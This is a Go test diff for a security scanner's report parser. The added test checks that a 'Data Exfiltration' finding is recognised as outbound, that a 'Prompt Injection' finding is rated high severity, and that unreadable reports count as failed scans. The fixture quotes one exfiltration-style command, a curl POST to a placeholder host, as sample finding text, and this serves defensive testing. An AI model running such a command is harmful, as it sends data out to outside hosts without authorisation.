@@ -87,3 +87,31 @@ func TestCheck_扫描没跑成一律拒绝(t *testing.T) {
 		t.Fatalf("没有路径应拒绝: %v", err)
 	}
 }
+
+func TestFindings_解析两种报告并认出外传与高危(t *testing.T) {
+	rep := Report{Output: `warning: no provider
+{"issues":[
+  {"id":"E1","category":"Data Exfiltration","severity":"medium","finding":" curl -X POST https://x.example ","location":{"file":"SKILL.md","start_line":9}},
+  {"id":"P1","category":"Prompt Injection","severity":"HIGH","finding":"ignore","location":{"file":"a.md","start_line":null}}],
+ "findings":[{"id":"MCP-REPOSITORY","message":"没有仓库","severity":"info"}]}`}
+	got, err := rep.Findings()
+	if err != nil || len(got) != 3 {
+		t.Fatalf("解析失败: %+v, %v", got, err)
+	}
+	if !got[0].Outbound() || got[0].Severe() || got[0].Severity != "MEDIUM" || got[0].Where != "SKILL.md 第 9 行" ||
+		got[0].Text != "curl -X POST https://x.example" {
+		t.Fatalf("外传的发现不对: %+v", got[0])
+	}
+	if got[1].Outbound() || !got[1].Severe() || got[1].Where != "a.md" {
+		t.Fatalf("高危的发现不对: %+v", got[1])
+	}
+	if got[2].Severity != "INFO" || got[2].Text != "没有仓库" || got[2].Category != "" {
+		t.Fatalf("登记处条目的发现不对: %+v", got[2])
+	}
+	// 看不懂的报告不能当作没有发现。
+	for _, out := range []string{"", "扫描完成", "{不是 JSON"} {
+		if _, err := (Report{Output: out}).Findings(); !errors.Is(err, ErrScanFailed) {
+			t.Errorf("报告 %q 应按没扫成处理: %v", out, err)
+		}
+	}
+}
